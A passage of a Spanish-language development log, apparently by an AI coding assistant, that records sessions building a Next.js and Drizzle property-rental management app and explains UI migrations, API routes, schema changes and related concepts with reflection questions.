- 4 KPI cards: `div rounded-xl` → `Card + CardContent`
- Estado de error: `div` manual → `Alert variant="destructive"`

**Migraciones completadas — ficha (`page.tsx` + 4 tabs):**
- `page.tsx`: avatar `w-14 h-14` → `size-14`, spinner `h-8 w-8` → `size-8`, mapa `estadoBadge` de `{cls}` a `{variant}`, 4 `<span>` badges → `StatusBadge`/`Badge`
- `inquilino-tab-cuenta-corriente.tsx`: alerta mora → `Alert`, 3 KPI cards → `Card`, historial → `Card + CardHeader + CardAction`, tabla HTML plana → `Table/*`, badges de tipo → `StatusBadge`, template literals → `cn()`
- `inquilino-tab-contrato.tsx`: mapa `statusLabel` de `{cls}` a `{variant}`, badge de estado → `StatusBadge`, resumen de contrato → `Card + CardHeader + CardContent`
- `inquilino-tab-propiedad.tsx`: datos de propiedad → `Card + CardHeader + CardContent`
- `inquilino-tab-propietario.tsx`: ya estaba migrado, sin cambios

**Pendiente (riesgo medio, sesión siguiente):**
- `TabsNavegacion` inline en `page.tsx`: requiere instalar `Tabs` de shadcn y decidir si mantener estado en URL
- `SelectFiltroMovimientos` inline en `inquilino-tab-cuenta-corriente.tsx`: `<select>` nativo → shadcn `Select` (adaptar `onChange` → `onValueChange`)
- `MiniCardContrato`, `MiniCardPropiedad`, `MiniCardPropietario`: tienen handlers de navegación/callback

### Por qué lo hice así y no de otra forma

**Patrón `{cls}` → `{variant}`:** los mapas de estado (estadoBadge, statusLabel) guardaban strings de clases CSS crudas como `"bg-error/10 text-error border-error/20"`. Eso duplica responsabilidad: el componente decide el color Y el mapa lo repite. Al pasar a `{variant}`, el color queda en `badge.tsx` una sola vez.

**`CardAction` para el select del historial:** el `CardHeader` de shadcn tiene un selector CSS `has-data-[slot=card-action]` que activa automáticamente un layout de 2 columnas cuando está presente un `CardAction`. Lo usé para el filtro de movimientos en lugar de un `flex justify-between` manual.

**No toqué los tabs:** `TabsNavegacion` sincroniza el tab activo con la URL via `router.replace`. El componente `Tabs` de shadcn maneja estado interno por defecto. Para preservar la URL sync habría que usar el modo controlado (`value`/`onValueChange`). Es una decisión de arquitectura, no un fix mecánico — quedó para la próxima sesión.

**`"use client"` removido de `EntityAvatar`:** el componente no usa hooks, router ni browser APIs. Solo calcula un string de CSS variable y renderiza. Quitarlo lo convierte en Server Component, que se renderiza en el servidor y no se incluye en el bundle del cliente.

### Conceptos que aparecieron

- **`size-*` vs `w-* h-*`**: `size-4` es lo mismo que `w-4 h-4` pero en una sola clase. La regla del proyecto es usar `size-*` cuando ancho y alto son iguales.
- **`cn()` para clases condicionales**: función utilitaria del proyecto que combina clases de forma segura. Reemplaza template literals (`\`clase ${condicion ? "a" : "b"}\``) por `cn("clase", condicion ? "a" : "b")`.
- **Server Component vs Client Component**: en Next.js, un componente sin `"use client"` se renderiza en el servidor. Solo necesita `"use client"` si usa hooks (`useState`, `useEffect`, etc.), router, o APIs del browser (`window`, `document`).
- **`[&>[data-slot=progress-indicator]]`**: selector CSS de Tailwind que apunta al hijo directo con `data-slot="progress-indicator"`. Así se puede cambiar el color del indicador del `Progress` de shadcn sin modificar el componente.
- **`CardAction`**: subcomponente de `Card` que shadcn posiciona automáticamente a la derecha usando CSS Grid con selector `has-data-[slot=card-action]`.
- **Blast radius**: el "radio de explosión" de un cambio. Un bug en `InquilinosList` deja a todos los usuarios sin ver la lista; un bug en `StatusBadge` es invisible si no se usa ese estado.

### Preguntas para reflexionar

1. ¿Por qué es mejor que el color del badge viva en `badge.tsx` y no en el mapa que define cada estado del dominio?
2. Si `EntityAvatar` es ahora un Server Component pero se usa dentro de `InquilinosList` que tiene `"use client"`, ¿cómo decide Next.js dónde renderizar `EntityAvatar`?

### Qué debería anotar en Obsidian

- [ ] **Concepto**: `cn()` — qué es, para qué sirve, y por qué es mejor que template literals en className
- [ ] **Concepto**: Server Components vs Client Components en Next.js — cuándo usar `"use client"` y cuándo no
- [ ] **Patrón**: `{cls}` → `{variant}` — cómo centralizar estilos de estado en el sistema de diseño
- [ ] **Concepto**: `size-*` y otras utilidades de Tailwind que condensan dos clases en una

---

## Sesión 2026-04-15 — Módulo de contratos: lista + ficha alineadas al wireframe

### Qué hice

Reescribí los dos componentes principales del módulo de contratos (`contratos-list.tsx` y `contrato-detalle.tsx`) para que se parezcan al máximo a los wireframes aprobados.

**Lista de contratos:**
- 5 KPI cards con los colores del sistema de diseño (vigentes accent, por vencer mustard, en redacción info, pend. firma neutral, vencidos error)
- Toolbar combinado: búsqueda libre + chips de estado en una sola barra
- Chips actualizados: Todos / Activos / Por vencer / En redacción / Pend. firma / Vencidos / Rescindidos
- Tabla con 8 columnas: N° (mono), Propiedad, Inquilino (con avatar iniciales), Propietario (con avatar), Vigencia (fecha + días restantes con color), Monto actual (importe + índice), Estado (tag pill), Acciones (↓ PDF visible al hover)
- Filas con borde izquierdo mustard para "por vencer", rojo para "vencido", y opacidad para "rescindido"

**Ficha de contrato:**
- Stepper de 5 pasos (visible solo para draft y pending_signature)
- Alert banner contextual según estado
- 4 KPI cards (alquiler base, depósito, duración, día de pago)
- Partes firmantes con avatares, roles y badge de estado de firma
- Sección de Cláusulas (estática por ahora)
- Acta de entrega checklist + Timeline de actividad en grid 2 columnas
- Footer de acciones contextual según estado del contrato

**API:**
- Agregué `adjustmentIndex` y `adjustmentFrequency` al response del GET /api/contracts
- Agregué soporte para `status=activos` (filtra active + expiring_soon en la DB)

### Por qué lo hice así y no de otra forma

Reescritura total en lugar de edición incremental porque la estructura del JSX era incompatible con el wireframe (layouts completamente distintos). Mantuve toda la lógica de datos intacta: mutations, queries, edición inline de condiciones y partes — solo cambié la presentación visual.

Para los colores usé las CSS variables del sistema de diseño ya definidas (`--primary-dim`, `--mustard-dim`, `--info-dim`, `--error-dim`, `--green-dim`) en lugar de hardcodear valores, para que funcionen tanto en modo claro como oscuro.

### Conceptos que aparecieron

- **Stepper de proceso**: componente visual que muestra en qué paso de un flujo está un elemento. Cada paso puede estar `done` (completado), `active` (en curso) o `pending` (futuro). Es como una barra de progreso pero con etiquetas descriptivas en cada punto.
- **CSS variables en Tailwind v4**: con `@theme inline` y `--color-xxx`, Tailwind genera clases como `bg-mustard-dim` o `text-green` que apuntan a las variables CSS. Podés usarlas directamente sin escribir el valor hex.
- **Group hover**: clase `group` en el `<tr>` y `group-hover:opacity-100` en el botón de acción del row — el botón ↓ solo aparece cuando el mouse está sobre la fila.
- **Filtro compuesto en Drizzle ORM**: `inArray(contract.status, ["active", "expiring_soon"])` para filtrar varios valores en una sola condición, equivalente a `WHERE status IN ('active', 'expiring_soon')`.

### Preguntas para reflexionar

1. ¿Por qué el wireframe separa "En redacción" de "Borrador" siendo el mismo estado en la DB? ¿Tiene sentido distinguirlos visualmente?
2. El timeline de actividad es estático hoy — ¿cuándo conviene agregar una tabla de eventos reales en la DB vs. derivar el estado del propio contrato?

### Qué debería anotar en Obsidian

- [ ] Concepto: Stepper de proceso (cuándo usarlo, cómo modelarlo visualmente)
- [ ] Patrón: Group hover en tablas con acciones por fila
- [ ] Decisión técnica: Reescritura total vs. edición incremental de un componente visual

---

## Sesión2 2026-04-13 (tarde) — Lista de propiedades: rebuild + modal de nueva propiedad

### Qué hice

Rehice la página `/propiedades` para que coincida con el wireframe `wireframe_lista_propiedades.html`, con tres ajustes específicos del usuario:

**API (`src/app/api/properties/route.ts`)**
- Agregué el filtro `?zone=` para buscar por barrio
- Extendí la búsqueda (`?search=`) para que también filtre por `zone`, `client.firstName` y `client.lastName` (antes solo buscaba en `title` y `address`)
- Agregué info de contrato activo por propiedad: una segunda query trae el contrato más reciente (activo, expirando, pendiente de firma o borrador) de cada propiedad de la página, y lo mergea al response como `contractNumber`, `contractEndDate`, `contractStatus`

**Popup de nuevo propietario (`src/components/properties/create-owner-popup.tsx`)**
- Componente nuevo: formulario mínimo con `Nombre*` (obligatorio), DNI y WhatsApp (opcionales)
- Aparece encima del modal con `z-[200]` y backdrop con blur
- Al guardar hace POST `/api/clients` y llama un callback `onCreated()` para que el form padre seleccione automáticamente el propietario recién creado

**Formulario rápido (`src/components/properties/quick-property-form.tsx`)**
- Eliminé el campo Superficie — ese dato se completa en la ficha de la propiedad
- Limité los resultados del buscador de propietario a 3 (era 5)
- "Crear nuevo propietario" ahora aparece siempre como última opción del dropdown (antes solo aparecía cuando no había resultados)
- Reemplacé el formulario inline de contacto por el nuevo `CreateOwnerPopup`
- Al crear una propiedad ahora redirige a `/propiedades/{id}` (antes al tablero)

**Lista principal (`src/components/properties/property-list.tsx`)**
- KPI cards: cada una con su propio color — Total (terracotta), Alquiladas (verde), Disponibles (mustard), Mantenimiento (naranja)
- Chips de filtro: cada estado activo muestra su propio color (antes todos usaban el primary terracotta)
- Filtro barrio: fila secundaria debajo del toolbar, debounced, sincronizado con URL params
- Columna "Contrato activo": muestra datos reales — número en monospace, fecha de vencimiento, alerta en mustard si quedan ≤60 días, azul para contratos pendientes de firma
- Botón "+ Nueva propiedad": más grande y prominente (sombra suave, padding mayor, icono más grande)
- Reemplacé el Drawer por un Dialog/Modal centrado (más fiel al wireframe)
- Columna "Acciones": botón "Ver →" que aparece en hover por cada fila
- Título de propiedad: fallback a `address` si `title` está vacío

---

### Por qué lo hice así y no de otra forma

**El contrato: segunda query en vez de N+1**
Podría haber hecho un query por cada propiedad para buscar su contrato. Eso se llama N+1: si hay 8 propiedades en la página, son 8 queries extra. En cambio hice una sola query con `WHERE propertyId IN (ids_de_la_página)` — siempre 1 query sin importar cuántas propiedades haya. Es el patrón estándar para este tipo de joins opcionales.

**El popup encima del modal: z-index manual**
React renderiza los elementos en capas (como papeles apilados). Para que el popup de nuevo propietario aparezca encima del modal de nueva propiedad, necesitaba un `z-index` más alto. El modal de shadcn/ui usa `z-50` internamente. Puse `z-[200]` en el popup, que en Tailwind es una notación para valores arbitrarios.

**Drawer → Dialog**
El Drawer (cajón que se desliza desde el costado) es útil para formularios de edición donde querés ver el fondo. El wireframe muestra un modal centrado clásico, que es más adecuado para un alta rápida (el contexto previo no importa tanto). Cambié a `Dialog` de shadcn/ui sin tocar la lógica interna del formulario.

---

### Conceptos que aparecieron

- **N+1 queries**: patrón a evitar donde por cada ítem de una lista hacés un query extra a la base de datos. Se resuelve con `IN (...)` o con joins.
- **z-index**: propiedad CSS que controla el orden de apilamiento visual. Números más altos aparecen encima de números más bajos.
- **Debounce**: técnica para "esperar que el usuario termine de escribir" antes de ejecutar una acción costosa (como un fetch). Si el usuario escribe rápido, cancelas el timer anterior y empezas uno nuevo.
- **URL-driven state**: guardar el estado de los filtros en la URL (`?status=rented&zone=Alberdi`). Permite compartir el link y mantener el estado al recargar la página.
- **`as const`**: en TypeScript, marca un array o objeto como "immutable y de tipo literal". Permite que TypeScript infiera tipos exactos en vez de tipos genéricos (`"active"` en vez de `string`).

---

### Preguntas para reflexionar

1. ¿Por qué cuando filtrás por barrio y después hacés una búsqueda general, los dos filtros se aplican juntos? ¿Cómo lo maneja el código?
2. Si en el futuro quisieramos ordenar la tabla por estado o por fecha de vencimiento del contrato, ¿qué parte del código habría que tocar?

---

### Qué debería anotar en Obsidian

- [ ] **Patrón: Evitar N+1 con IN (...)** — `tag: patron/pr` — Cómo traer datos relacionados de forma eficiente: una sola query con `WHERE id IN (lista)` en vez de una query por ítem
- [ ] **Concepto: z-index y stacking context** — `tag: concepto/pr` — Cómo funciona el apilamiento de elementos en CSS y por qué no siempre alcanza con poner un número alto

---

## Sesión 2026-04-13 — Módulo Propiedades: lista mejorada + ficha completa

### Qué hice

- **Lista de propiedades** (`property-list.tsx`): corregí los colores de los tags de estado para que coincidan con el wireframe (verde = alquilada, mostaza = disponible, naranja = mantenimiento, azul = reservada). Agregué borde izquierdo de color en las filas según el estado. Hice cada fila clickeable para navegar a la ficha individual (`/propiedades/[id]`).
- **Constantes** (`lib/properties/constants.ts`): agregué `"maintenance"` como estado válido en `PROPERTY_STATUSES`, que antes estaba incompleto y rompía el filtro de la lista.
- **API GET `/api/properties`**: agregué el count de `maintenance` al objeto de respuesta que ya lo pedía el front pero nunca llegaba.
- **API nueva `GET /api/properties/[id]`**: devuelve todos los datos de una propiedad con JOIN al propietario (client). También implementé `PATCH /api/properties/[id]` para editar desde la ficha.
- **Ficha de propiedad** (`/propiedades/[id]/page.tsx`): nueva página completa con:
  - Header con ícono por tipo de propiedad, dirección, status badge y 4 widgets (propietario clickeable → lleva a su ficha, contrato activo placeholder, superficie, tareas placeholder).
  - 7 tabs: **Personas vinculadas** (propietario con card clickeable + placeholders para inquilino y garantes), **Datos** (vista + modo edición con form), **Contratos** (placeholder), **Servicios / Mantenimiento / Documentos / Tareas** (placeholders deshabilitados, para desarrollar).

### Por qué lo hice así y no de otra forma

- **Una página por entidad, no un slide panel**: el wireframe lo plantea así. Un slide panel tiene espacio limitado; la ficha necesita tabs, widgets en el header y edición inline — cosas que necesitan toda la pantalla.
- **Placeholder tabs deshabilitados** en lugar de omitirlos: el usuario pidió explícitamente dejar los tabs en su lugar para desarrollarlos después. Un tab deshabilitado muestra la estructura futura sin engañar al usuario con una pantalla rota.
- **Edición inline en el tab Datos** en lugar de un modal separado: el wireframe tiene el botón "Editar" en el topbar y activa/desactiva los campos del tab. Esto mantiene el contexto visible mientras editás.
- **`PATCH` con solo los campos presentes**: en lugar de mandar todo el objeto, mando solo lo que cambió. Esto evita pisar datos con `undefined` si el schema crece.

### Conceptos que aparecieron

- **Dynamic route en Next.js** (`/propiedades/[id]`): la carpeta `[id]` es una convención de Next.js que dice "cualquier cosa en este segmento de la URL es un parámetro". Es como un comodín. Dentro del componente lo leés con `useParams()`.
- **PATCH vs PUT**: PUT reemplaza el recurso completo, PATCH modifica solo los campos que mandás. Usamos PATCH porque queremos actualizar solo algunos campos sin pisar el resto.
- **`Promise<{ id: string }>`** en params del route handler: en Next.js 15, los params llegaron a ser asíncronos. Hay que hacer `await params` antes de leer el `id`. Es un cambio de Next.js 14 → 15.
- **LEFT JOIN en Drizzle**: cuando hacemos `db.select().from(property).leftJoin(client, ...)`, le decimos a la base de datos "traeme la propiedad aunque no encuentres el cliente asociado". Si fuera `innerJoin`, una propiedad sin propietario directamente no aparecería en los resultados.
- **`countsMap`**: en la API de lista, agrupamos por status con `GROUP BY` y construimos un mapa `{ rented: 5, available: 3, ... }`. Antes faltaba `maintenance` en ese mapa porque no estaba en las constantes — el contador siempre daba 0 aunque hubiera propiedades en mantenimiento.

### Preguntas para reflexionar

1. ¿Por qué una propiedad en la DB tiene `ownerId` que apunta a `client` en lugar de tener su propio concepto de "Propietario"? ¿Qué ventaja y qué desventaja tiene unificar propietarios, inquilinos y garantes en una sola tabla `client`?
2. El tab "Contratos" hoy es un placeholder. Cuando lo desarrolles, ¿qué datos necesitarías agregar al schema para representar un contrato de alquiler argentino?

### Qué debería anotar en Obsidian

- [ ] **Concepto**: Dynamic routes en Next.js (`[id]` folder) — qué son, cómo se leen con `useParams`, cómo conviven con routes estáticas
- [ ] **Decisión técnica**: Por qué usamos PATCH y no PUT para actualizar propiedades — diferencia semántica y práctica
- [ ] **Patrón**: Ficha de entidad con tabs en Next.js App Router — cómo manejar el tab activo con `useSearchParams` + `router.replace` para que el estado sobreviva a un refresh

---

## Sesión 2026-04-13 — Módulo Control de Servicios

### Qué hice

Implementé el módulo completo de **Control de Servicios** desde cero:

- **Schema de base de datos** (`src/db/schema/servicio.ts`): 3 tablas nuevas: `servicio` (configuración por propiedad), `servicioComprobante` (una entrada por período cuando se carga el recibo), y `servicioOmision` (cuando el staff decide omitir el bloqueo con justificación).
- **Constantes** (`src/lib/servicios/constants.ts`): tipos de servicio, labels, íconos emoji, estados, y una función `calcularEstadoServicio()` que determina si un servicio está al día, pendiente, en alerta o bloqueado.
- **5 API routes**: `/api/servicios` (listar/crear), `/api/servicios/[id]` (detalle/editar), `/api/servicios/[id]/comprobante` (cargar recibo), `/api/servicios/[id]/omitir-bloqueo` (bypass del bloqueo con motivo), `/api/servicios/resumen` (KPIs para el dashboard).
- **Vista global** `/servicios`: página con selector de período, 4 KPI cards, leyenda de estados, búsqueda, filtros por estado, y tabla de propiedades con chips de servicio coloreados.
- **Tab en la ficha de propiedad** (`ServicioTabPropiedad`): lista de servicios con cards clickeables, alerta visible si hay servicios vencidos.
- **Drawer de detalle** (`ServicioDrawerDetalle`): panel lateral con estado del período, formulario de carga de comprobante, toggle de obligatoriedad, historial de comprobantes, y sección de omisión de bloqueo.
- **Formulario nuevo servicio** (`ServicioFormNuevo`): picker de tipo con iconos, campos de empresa/cuenta/titular, toggle de bloqueo.
- Migración aplicada a la base de datos con `bun run db:push`.
- Build TypeScript sin errores.

### Por qué lo hice así y no de otra forma

**Por qué 3 tablas separadas en vez de una sola:**
Cada tabla tiene un ciclo de vida y un propósito distintos. `servicio` es la configuración permanente (cambia poco). `servicioComprobante` se crea una vez por mes cuando alguien sube el recibo. `servicioOmision` es un evento de auditoría excepcional que el staff registra con un motivo. Mezclar todo en una sola tabla haría las consultas más complicadas y los datos menos claros.

**Por qué el estado se calcula en el backend (no se guarda):**
El estado depende de *cuántos días pasaron desde el inicio del período* — eso cambia todos los días. Si lo guardaras en la base de datos tendrías que actualizarlo constantemente. Es más limpio calcularlo al momento de leer.

**Por qué el tab de servicios en la ficha de propiedad es un componente separado:**
El wireframe muestra que el tab vive dentro de la ficha de propiedad. No creamos la ficha completa en esta sesión (ya existe `/propiedades/[id]`), pero el tab queda listo para embeber cuando se agregue esa pantalla.

**Por qué el drawer usa `vaul` (el componente Drawer ya existente):**
El proyecto ya usa `vaul` para los drawers en propiedades. Reutilizar el mismo componente mantiene consistencia visual y de comportamiento.

### Conceptos que aparecieron

- **Schema Drizzle ORM**: es como el "plano de la base de datos". Cada `pgTable(...)` es una tabla. Los campos son las columnas. Las FK (foreign keys) son como referencias entre tablas — "este campo apunta a ese otro registro".
- **Migración**: cuando modificás el schema, la migración es el SQL que lleva la base de datos del estado anterior al nuevo. `db:generate` la crea, `db:push` la aplica.
- **Estado calculado vs. estado persistido**: algunos datos se pueden derivar de otros en el momento de consultarlos. No siempre conviene guardar un valor que puede quedar "viejo" — a veces es más confiable calcularlo fresco.
- **Mutation (TanStack Query)**: `useMutation` es para operaciones que modifican datos (POST, PUT, DELETE), a diferencia de `useQuery` que es para leer. Después de mutate, se invalidan las queries para que la UI se refresque.
- **`as const`**: en TypeScript, `["a", "b"] as const` crea un array donde los valores son tipos fijos, no solo strings genéricos. Permite derivar tipos (`typeof ARRAY[number]`) que el compilador puede verificar.

### Preguntas para reflexionar

1. ¿Cuándo conviene calcular un valor al momento de consultar versus guardarlo en la base de datos? ¿Cuál es el criterio para elegir?
2. El drawer de detalle hace varias llamadas a la API (una por servicio cuando se abre). ¿Cómo cambiaría esto si tuvieras miles de propiedades? ¿Habría algún problema de rendimiento?

### Qué debería anotar en Obsidian

- [ ] **Patrón**: "Estado calculado en backend" — cómo y cuándo calcular estados derivados en lugar de persistirlos (`calcularEstadoServicio` en `src/lib/servicios/constants.ts`)
- [ ] **Concepto**: "Migración de base de datos" — qué es, cuándo se genera, cómo se aplica con Drizzle
- [ ] **Decisión técnica**: "3 tablas vs 1 tabla para servicios/comprobantes/omisiones" — por qué separar entidades con ciclos de vida distintos
- [ ] **Patrón**: "Módulo completo en Next.js App Router" — la receta de 7 pasos: schema → constantes → permisos → API routes → página → componentes → navegación

---

## Sesión 2026-04-13 — Módulo Propietarios: Lista + Ficha + Cuenta Corriente

### Qué hice

Construí el módulo de propietarios completo desde los wireframes:

1. **Schema**: agregué `cuit` y `status` ("activo" | "suspendido" | "baja") a la tabla `client`. Apliqué con `db:push`.

2. **4 endpoints nuevos** en `src/app/api/propietarios/`:
   - `GET /api/propietarios` — lista con filtro por status, búsqueda cross (nombre/DNI/tel/dirección de propiedad), conteo de propiedades y contratos activos
   - `GET/PATCH /api/propietarios/[id]` — ficha completa + edición
   - `GET /api/propietarios/[id]/cuenta-corriente` — KPIs + movimientos agrupados
   - `POST /api/propietarios/[id]/movimientos` — registrar crédito/débito manual

3. **Lista redeseñada** (`propietarios-list.tsx`): search bar con dropdown, filter pills Activos/Inactivos/Todos, tabla con avatares y badges, slide-out panel al hacer click en una fila, modal de alta rápida.

4. **Slide panel** (`propietario-slide-panel.tsx`): panel lateral que muestra cuenta corriente resumida del propietario seleccionado.

5. **Ficha del propietario** (`/propietarios/[id]`): header con avatar + barra de completitud con chips clicables, tabs (Datos / Cuenta Corriente / Propiedades deshabilitado / Documentos deshabilitado).

6. **Tab Datos**: cards de datos personales y bancarios con modo edición inline, card de estado, danger zone con confirmación para suspender/dar de baja.

7. **Tab Cuenta Corriente**: 3 KPIs, tabla de movimientos agrupados por período, FAB flotante con modales para generar liquidaciones y agregar movimientos manuales.

### Por qué lo hice así y no de otra forma

- **Standalone Route Handlers** (no ElysiaJS): el proyecto ya los usaba para `clients`, `properties`, `inquilinos`. Seguir el mismo patrón mantiene coherencia y evita mezclar paradigmas.
- **Reutilizar tabla `client` con `type="propietario"`**: la BD ya estaba diseñada así. Crear una tabla separada sería duplicar columnas innecesariamente.
- **Búsqueda cross por propiedad**: en lugar de un full-text search, hice dos consultas (matches directos + matches por propiedad) y las uní en el servidor. Es claro y fácil de mantener.
- **`db:push` en lugar de `db:migrate`**: las tablas ya existían (creadas antes con push). El archivo `0000` de migrate intentaba CREATE ALL, que falla si las tablas ya existen. Push detecta solo el diff.
- **`useState` + fetch directo** en los modales de cuenta corriente: sin Eden Treaty porque los endpoints nuevos son standalone Route Handlers, no ElysiaJS. TanStack Query maneja el caché.

### Conceptos que aparecieron

- **Schema migration vs push**: migration es un historial de cambios que se aplica en orden (bueno para producción). Push es "llevá la base a este estado ahora" (solo para desarrollo). Usar push cuando ya hay tablas y no hay historial previo evita el error de "tabla ya existe".
- **Route Handler standalone vs ElysiaJS**: dos formas de definir APIs en Next.js App Router. Los standalone son archivos `route.ts` en carpetas de `app/api/`. ElysiaJS es un framework de servidor que vive en un catch-all `[[...slugs]]`. Se pueden usar juntos.
- **Búsqueda cross-tabla**: buscar en datos de otra tabla relacionada. En SQL sería un JOIN + WHERE. Con Drizzle ORM se hace con `innerJoin` o con dos queries separadas.
- **FAB (Floating Action Button)**: botón circular flotante en la esquina inferior, común en apps móviles. Se expande para mostrar sub-acciones.
- **Optimistic update**: mostrar el resultado en la UI antes de que el servidor confirme. Acá lo usé de forma simple: marcar la fila nueva con tag "Nuevo" después de crear y esperar 8 segundos.
- **Barra de completitud**: medir qué tan lleno está un formulario asignando pesos distintos a cada campo (CBU tiene más peso porque es crítico para liquidar).

### Preguntas para reflexionar

1. El endpoint `GET /api/propietarios` hace 3 consultas (propietarios, conteo de propiedades, conteo de contratos) por cada listado. ¿Cuándo se volvería lento esto? ¿Qué herramienta existe para hacerlo en una sola consulta?
2. La barra de completitud calcula el porcentaje en el frontend. ¿Qué ventajas y desventajas tiene calcularlo en el servidor?

### Qué debería anotar en Obsidian

- [ ] **Concepto**: Migration vs Push en Drizzle ORM — cuándo usar cada uno y por qué
- [ ] **Patrón**: Búsqueda cross-tabla (buscar propietario por dirección de su propiedad) — dos queries + merge en servidor
- [ ] **Concepto**: Standalone Route Handlers en Next.js App Router — cómo funcionan y cuándo usarlos
- [ ] **Decisión técnica**: reutilizar tabla `client` polimórfica vs tabla separada por tipo de persona
- [ ] **Concepto**: TanStack Query `queryKey` — cómo funciona el caché y cuándo se invalida

---

## Sesión 2026-04-13 — Contratos: condiciones editables, servicios, índices custom

### Qué hice

- Agregué `adjustmentFrequency` (frecuencia de ajuste) al schema de contratos: cuántos meses pasan entre cada actualización del índice (mensual, trimestral, semestral, anual, etc.)
- Agregué 6 campos de responsabilidad de servicios al schema de propiedades: `serviceLuz`, `serviceGas`, `serviceAgua`, `serviceMunicipalidad`, `serviceRendas`, `serviceExpensas`. Cada uno puede ser "inquilino", "propietario" o "na" (no aplica).
- Creé la tabla `customAdjustmentIndex` para guardar índices de ajuste personalizados (además de los estándar ICL, IPC, CER, UVA).
- Creé la API `/api/adjustment-indexes` (GET y POST) para listar y crear índices custom.
- Actualicé el GET y agregué un PATCH en `/api/contracts/[id]` para editar condiciones desde la ficha.
- Actualicé la ficha del contrato (`contrato-detalle.tsx`): modo edición inline en el card de condiciones, nueva sección "Servicios e impuestos" con íconos.
- Actualicé el formulario de nuevo contrato: campo de frecuencia + selector de índice que incluye los custom + formulario inline para agregar uno nuevo.
- Corrí `db:push` para aplicar los cambios al schema en la base de datos.

### Por qué lo hice así y no de otra forma

**Índices custom como tabla separada**: podría haberlos guardado como un campo JSON en la tabla agency, pero una tabla separada es más limpia: permite buscar, listar y referenciar fácilmente. Además, si en el futuro querés asociar datos extra al índice (tipo de fórmula, fuente de datos) ya tenés el lugar.

**Servicios en la propiedad, no en el contrato**: los servicios son una característica de la propiedad, no del contrato en sí. Una misma propiedad siempre va a tener la misma configuración de servicios (la municipalidad siempre la paga el propietario, por ejemplo). Si los pusiéramos en el contrato, estaríamos duplicando info. El contrato solo los *muestra* para que queden claros.

**PATCH con campos opcionales**: el endpoint PATCH no requiere enviar todos los campos — solo los que querés cambiar. Esto se llama "partial update". Así, si solo editás el monto, no tenés que mandar las fechas, el índice, etc. Internamente construimos el objeto `updates` solo con los campos que llegaron.

**Edición inline en el card de condiciones**: en vez de ir a una página de edición separada, el card hace toggle entre modo visualización y modo edición. Más cómodo para cambiar un dato sin perder contexto de la ficha completa.

### Conceptos que aparecieron

- **PATCH vs PUT**: PUT reemplaza el recurso completo (tenés que mandar todo). PATCH actualiza parcialmente (solo lo que querés cambiar). Para editar condiciones de un contrato, PATCH es lo correcto porque no siempre querés tocar todos los campos.
- **Partial update pattern**: construir el objeto de actualizaciones dinámicamente, agregando solo las claves que llegaron en el body. Si el campo no está en el request, no lo tocamos.
- **Schema migration (db:push)**: cada vez que modificás el schema de la base de datos (agregás columnas, creás tablas), hay que sincronizarlo con la base real. `db:push` hace eso directamente en desarrollo.
- **Modo edición inline**: patrón de UI donde el mismo componente alterna entre "mostrar datos" y "formulario de edición" con un estado booleano (`isEditing`). Común en dashboards para no perder contexto.

### Preguntas para reflexionar

1. ¿Por qué usamos PATCH y no PUT para editar condiciones? ¿Cuándo usarías PUT?
2. Los servicios se guardan en la propiedad pero se muestran en el contrato. ¿Cómo harías si el contrato necesitara sobreescribir una de esas condiciones (ej: en este contrato particular, el gas lo paga el propietario aunque normalmente lo paga el inquilino)?

### Qué debería anotar en Obsidian

- [ ] **Concepto**: PATCH vs PUT — cuándo usar cada uno, con ejemplo de este contrato
- [ ] **Decisión técnica**: guardar servicios en property y no en contract — motivación y cuándo revisarlo
- [ ] **Patrón**: edición inline con toggle isEditing — receta con código base

---

## Sesión 2026-04-13 — Caja: edición, buscadores y colores

### Qué hice

1. **Colores verde/rojo para ingresos y egresos** — los badges de tipo en la tabla y los montos ahora son verdes para ingreso y rojos para egreso. Los KPIs y el pie de tabla también usan esos colores. El saldo neto pasa a azul cuando es cero (en la práctica raro, pero definido).

2. **Constantes de color** — definí `C_INGRESO`, `C_EGRESO` y `C_NEUTRO` al principio del archivo para que el color esté en un solo lugar y no repetido en 6 lados. Si mañana el verde tiene que ser otro tono, se cambia en un solo lugar.

3. **`BuscadorSelector`** — nuevo componente que reemplaza los `<select>` nativos. Tiene un input de texto donde se puede escribir para filtrar. Cuando el input tiene foco, aparece un dropdown con las opciones filtradas en tiempo real.

4. **Búsqueda contextual en contratos** — las opciones de contratos ahora incluyen dirección de la propiedad en el label visible (`CON-0001 · Calle Falsa 123`) y los nombres de propietario e inquilinos como texto extra de búsqueda (no visible en el label principal, pero sí buscable). Así podés escribir "García" y encontrar el contrato de García aunque el label no diga García.

5. **Botón "✕" para limpiar** — cuando hay una opción seleccionada, aparece una X dentro del campo para deseleccionarla sin tener que abrir el dropdown.

---

### Por qué lo hice así y no de otra forma

- **Colores hardcoded en lugar de tokens del tema**: El tema Arce no tiene tokens para "verde éxito" ni "azul neutro". La alternativa era agregar los tokens a `globals.css`, pero eso cambia el design system completo. Para el MVP, definir las constantes en el mismo archivo es suficiente. Si el diseño escala, se mueven al tema.

- **`BuscadorSelector` en lugar de una librería externa**: Existen librerías como `react-select` o `cmdk` que hacen exactamente esto. Pero para el MVP con 4 selectores, traer una dependencia nueva agrega complejidad de configuración y temas. El componente propio tiene exactamente lo que necesitamos, nada más.

- **`onMouseDown` en el dropdown para evitar que el blur cierre el menú**: Cuando hacés click en una opción del dropdown, el navegador primero dispara `blur` en el input (que cerraría el menú) y *después* dispara `click` en la opción. Si el menú ya cerró, el click no llega a la opción. La solución es `e.preventDefault()` en el `onMouseDown` del contenedor del dropdown: eso evita que el input pierda foco al hacer click dentro del dropdown. El blur solo ocurre cuando el usuario sale del componente completamente.

- **`searchText` separado del `label`**: Para contratos, el label visible es `"CON-0001 · Calle Falsa 123"`. Pero también quiero poder buscar por `"García"` (el propietario). Si metiera todo en el label, el label mostrado sería demasiado largo. Con `searchText` separo lo que se *muestra* de lo que se *busca*.

---

### Conceptos que aparecieron

- **Bubbling de eventos (propagación)**: Cuando hacés click en un elemento, el evento "sube" por el árbol de la página — primero el elemento clickeado, después su contenedor, después el de arriba, etc. `e.preventDefault()` detiene la acción por defecto del navegador (como perder el foco). `e.stopPropagation()` detiene el ascenso del evento (usado antes para que el click en un chip no abra el modal). Son dos cosas distintas.

- **Orden de eventos del navegador**: Para cualquier interacción de click, el navegador dispara los eventos en este orden: `mousedown` → `focus/blur` → `mouseup` → `click`. Es por eso que para interceptar el blur, hay que actuar en `mousedown`, no en `click` (que llega tarde).

